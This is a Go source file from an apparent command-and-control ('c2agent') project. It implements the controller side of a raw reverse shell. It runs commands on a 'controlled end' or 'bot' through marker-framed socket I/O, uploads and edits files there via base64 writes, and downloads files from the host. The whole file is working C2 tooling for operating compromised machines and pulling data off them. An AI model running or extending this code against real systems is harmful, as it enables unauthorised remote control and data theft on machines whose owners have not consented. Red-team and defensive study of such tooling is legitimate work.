package shell

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"c2agent/internal/agent"
)

const (
	// shutdownGrace bounds how long Backend.Shutdown waits for the controlled
	// end to close the socket on its own before the C2 forces it shut.
	shutdownGrace = 1 * time.Second
	// maxDrainLineBuf caps the partial-line buffer while a timed-out command is
	// being drained: its content is discarded anyway, so a runaway command
	// cannot grow memory without bound.
	maxDrainLineBuf = 32 * 1024
)

type shellResult struct {
	out string
	err error
}

type pendingReq struct {
	lastCommand string
	marker      string
	raw         bool
	lines       []string
	ch          chan shellResult
	// draining is set once the request times out: the command is still
	// running, so its remaining output is discarded (not buffered) while the
	// reader waits for the marker to resynchronize.
	draining bool
}

// Backend drives one raw reverse shell using the echo-marker framing.
type Backend struct {
	id      string
	conn    net.Conn
	writeMu *sync.Mutex
	osName  string

	mu      sync.Mutex
	pending *pendingReq
	lineBuf string

	closed chan struct{}
}

func newBackend(id string, conn net.Conn) *Backend {
	return &Backend{id: id, conn: conn, writeMu: &sync.Mutex{}, closed: make(chan struct{})}
}

func (b *Backend) setOS(os string) { b.osName = os }

func (b *Backend) write(p []byte) error {
	b.writeMu.Lock()
	defer b.writeMu.Unlock()
	_, err := b.conn.Write(p)
	return err
}

// request sends one single-line command and waits for the marker-delimited
// reply. Queue/exec timeout is provided by the caller's context.
func (b *Backend) request(ctx context.Context, command string) (string, error) {
	return b.requestMode(ctx, command, false)
}

// requestRaw is like request but preserves the reply verbatim: only the marker
// framing and the echoed command line are removed. It is used for file reads,
// whose content must not be mangled by the prompt/blank-line heuristics in
// stripShellResponse.
func (b *Backend) requestRaw(ctx context.Context, command string) (string, error) {
	return b.requestMode(ctx, command, true)
}

func (b *Backend) requestMode(ctx context.Context, command string, raw bool) (string, error) {
	command = oneLine(command)
	marker := randMarker()
	p := &pendingReq{marker: marker, lastCommand: command, raw: raw, ch: make(chan shellResult, 1)}

	b.mu.Lock()
	if b.pending != nil {
		b.mu.Unlock()
		// A previous command timed out and is still running (its marker has not
		// arrived); refuse to write a new command into the middle of it.
		return "", agent.ErrAgentBusy
	}
	b.pending = p
	b.lineBuf = ""
	b.mu.Unlock()

	payload := command + "\necho " + marker + "\n"
	if err := b.write([]byte(payload)); err != nil {
		b.clearPending(p)
		return "", agent.NewNetworkError("send: %v", err)
	}

	select {
	case r := <-p.ch:
		return r.out, r.err
	case <-ctx.Done():
		if errors.Is(ctx.Err(), context.DeadlineExceeded) {
			// Execution timeout. Leave the request pending and the connection
			// open: the command may still be running, so its late output must
			// not be attributed to a later request. Busy() now reports true, so
			// no further command is written until the marker arrives; the
			// dispatcher decides whether to disconnect or keep waiting
			// (timeout_action).
			b.markDraining(p)
			return "", ctx.Err()
		}
		// Cancelled (session stop / agent close): the command may still be
		// running and its late output must never be attributed to a later
		// request, so give up on this request and drop the connection.
		b.abortRequest(p)
		return "", ctx.Err()
	}
}

// markDraining flags a timed-out request so its remaining output is discarded
// (only the marker is sought) and drops any content buffered so far.
func (b *Backend) markDraining(p *pendingReq) {
	b.mu.Lock()
	if b.pending == p {
		p.draining = true
		p.lines = nil
	}
	b.mu.Unlock()
}

// Busy reports whether a request is still outstanding (e.g. a command that
// timed out but has not finished). Implements agent.BusyReporter.
func (b *Backend) Busy() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.pending != nil
}

// abortRequest clears the pending request and drops the connection: a
// timed-out command may still be running, so its late output must never be
// attributed to a later request, and the bot is re-established on reconnect.
func (b *Backend) abortRequest(p *pendingReq) {
	b.mu.Lock()
	if b.pending == p {
		b.pending = nil
	}
	b.mu.Unlock()
	_ = b.conn.Close()
}

func (b *Backend) clearPending(p *pendingReq) {
	b.mu.Lock()
	if b.pending == p {
		b.pending = nil
	}
	b.mu.Unlock()
}

func (b *Backend) failPending(err error) {
	b.mu.Lock()
	p := b.pending
	b.pending = nil
	b.mu.Unlock()
	if p != nil {
		select {
		case p.ch <- shellResult{err: agent.NewNetworkError("connection lost: %v", err)}:
		default:
		}
	}
}

func (b *Backend) readLoop() {
	defer close(b.closed)
	buf := make([]byte, 4096)
	for {
		n, err := b.conn.Read(buf)
		if n > 0 {
			b.handleData(string(buf[:n]))
		}
		if err != nil {
			b.failPending(err)
			return
		}
	}
}

func (b *Backend) handleData(data string) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.lineBuf += data
	for {
		idx := strings.IndexByte(b.lineBuf, '\n')
		if idx < 0 {
			// While draining, bound the partial-line buffer: a line longer than
			// the cap cannot be the (short) marker, so drop it instead of
			// letting a runaway command grow memory. The normal path keeps full
			// lines (Windows read_file returns one long base64 line).
			if b.pending != nil && b.pending.draining && len(b.lineBuf) > maxDrainLineBuf {
				b.lineBuf = ""
			}
			return
		}
		line := strings.TrimRight(b.lineBuf[:idx], "\r")
		b.lineBuf = b.lineBuf[idx+1:]
		if b.pending != nil && line == b.pending.marker {
			p := b.pending
			b.pending = nil
			var out string
			if p.raw {
				out = stripFileResponse(p.lines, p.marker, p.lastCommand)
			} else {
				out = stripShellResponse(p.lines, p.marker, p.lastCommand)
			}
			select {
			case p.ch <- shellResult{out: out}:
			default:
			}
			b.lineBuf = ""
			continue
		}
		if b.pending != nil && !b.pending.draining {
			b.pending.lines = append(b.pending.lines, line)
		}
	}
}

// Execute implements agent.Backend.
func (b *Backend) Execute(ctx context.Context, action string, params map[string]any) (string, error) {
	if action == "edit_file" {
		return b.editFile(ctx, params)
	}
	cmd, err := actionToShell(action, params, b.osName)
	if err != nil {
		return "Error: " + err.Error(), nil
	}
	if strings.TrimSpace(cmd) == "" {
		return "Error: empty shell command", nil
	}
	var out string
	if action == "read_file" {
		out, err = b.requestRaw(ctx, cmd)
	} else {
		out, err = b.request(ctx, cmd)
	}
	if err != nil {
		return "", err
	}
	switch action {
	case "list_dir":
		out = formatListing(out)
	case "read_file":
		if b.osName == "Windows" {
			out = decodeReadFile(out, params)
		}
		// Match the native agents: whole-file reads are capped at 51200 chars.
		if s := paramString(params["start_line"]); s == "" || s == "0" {
			out = truncateRunes(out, 51200)
		}
	}
	return out, nil
}

// Upload base64-encodes the local file and writes it in one instruction.
func (b *Backend) Upload(ctx context.Context, localPath, destPath string) (string, error) {
	data, err := os.ReadFile(localPath)
	if err != nil {
		return "Error: cannot read local file: " + err.Error(), nil
	}
	b64 := base64.StdEncoding.EncodeToString(data)
	cmd, err := writeBase64Cmd(b.osName, destPath, b64)
	if err != nil {
		return "Error: " + err.Error(), nil
	}
	out, err := b.request(ctx, cmd)
	if err != nil {
		return "", err
	}
	if strings.TrimSpace(out) == "" {
		return fmt.Sprintf("Successfully uploaded: %s (%d bytes)", destPath, len(data)), nil
	}
	return out, nil
}

// Download fetches the file as base64 and lands it in
// <destDir>/<basename(srcPath)>.
func (b *Backend) Download(ctx context.Context, srcPath, destDir string) (string, error) {
	cmd, err := readBase64Cmd(b.osName, srcPath)
	if err != nil {
		return "", agent.NewNetworkError("%v", err)
	}
	out, err := b.request(ctx, cmd)
	if err != nil {
		return "", err
	}
	data, ok := decodeBase64(out)
	if !ok {
		trimmed := strings.TrimSpace(out)
		if trimmed == "" {
			trimmed = "empty response"
		}
		return "", agent.NewNetworkError("download: %s", trimmed)
	}
	dest := filepath.Join(destDir, agent.BaseName(srcPath))
	if err := os.WriteFile(dest, data, 0o644); err != nil {
		return "", err
	}
	return dest, nil
}

// Shutdown closes the shell by sending "exit", then waits briefly for the
// controlled end to close the socket. If it does not (e.g. a wedged shell or a
// command eating the input), the C2 forces the connection shut so a dead
// connection cannot linger in the registry forever.
func (b *Backend) Shutdown(ctx context.Context) error {
	if err := b.write([]byte("exit\n")); err != nil {
		return err
	}
	select {
	case <-b.closed:
	case <-time.After(shutdownGrace):
		_ = b.conn.Close()
	}
	return nil
}

// Close closes the underlying connection.
func (b *Backend) Close() error { return b.conn.Close() }

func (b *Backend) editFile(ctx context.Context, params map[string]any) (string, error) {
	path := paramString(params["path"])
	if path == "" {
		return "Error: missing path", nil
	}
	readCmd, err := readFileCmd(b.osName, path, "", "")
	if err != nil {
		return "Error: " + err.Error(), nil
	}
	content, err := b.requestRaw(ctx, readCmd)
	if err != nil {
		return "", err
	}
	if b.osName == "Windows" {
		if data, ok := decodeBase64(content); ok {
			content = string(data)
		}
	}
	stripped := strings.TrimSpace(content)
	low := strings.ToLower(stripped)
	if strings.HasPrefix(stripped, "Error:") || strings.HasPrefix(stripped, "cat:") ||
		strings.HasPrefix(stripped, "sed:") || strings.HasPrefix(low, "cannot") {
		return stripped, nil
	}
	edited, ok := applyEdit(content,
		paramString(params["operation"]),
		paramString(params["start_line"]),
		paramString(params["end_line"]),
		paramString(params["content"]))
	if !ok {
		return "Error: bad edit request", nil
	}
	b64 := base64.StdEncoding.EncodeToString([]byte(edited))
	writeCmd, err := writeBase64Cmd(b.osName, path, b64)
	if err != nil {
		return "Error: " + err.Error(), nil
	}
	if _, err := b.request(ctx, writeCmd); err != nil {
		return "", err
	}
	return fmt.Sprintf("Successfully performed %s on file: %s", paramString(params["operation"]), path), nil
}

func decodeReadFile(b64out string, params map[string]any) string {
	data, ok := decodeBase64(b64out)
	if !ok {
		return b64out
	}
	content := string(data)
	start := strings.TrimSpace(paramString(params["start_line"]))
	if start == "" || start == "0" {
		return content
	}
	s, err := atoiSafe(start)
	if err != nil {
		return "Error: invalid start_line: " + start
	}
	if s < 1 {
		s = 1
	}
	lines := strings.Split(content, "\n")
	if s-1 >= len(lines) {
		return ""
	}
	end := len(lines)
	if e := strings.TrimSpace(paramString(params["end_line"])); e != "" {
		if ev, err := atoiSafe(e); err == nil && ev >= s && ev <= len(lines) {
			end = ev
		}
	}
	return strings.Join(lines[s-1:end], "\n")
}
